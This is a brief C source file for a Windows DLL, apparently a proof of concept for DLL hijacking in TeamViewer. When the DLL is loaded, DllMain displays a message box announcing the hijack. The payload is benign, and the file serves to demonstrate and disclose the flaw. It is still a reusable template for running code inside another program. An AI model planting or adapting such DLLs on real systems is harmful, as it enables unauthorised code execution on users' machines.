#include <windows.h>
#define DllExport __declspec (dllexport)

BOOL WINAPI  DllMain (
            HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
{
  dll_hijack();
  return 0;
}

int dll_hijack()
{
  MessageBox(0, "TeamViewer DLL Hijacking!", "DLL Message", MB_OK);
  return 0;
}


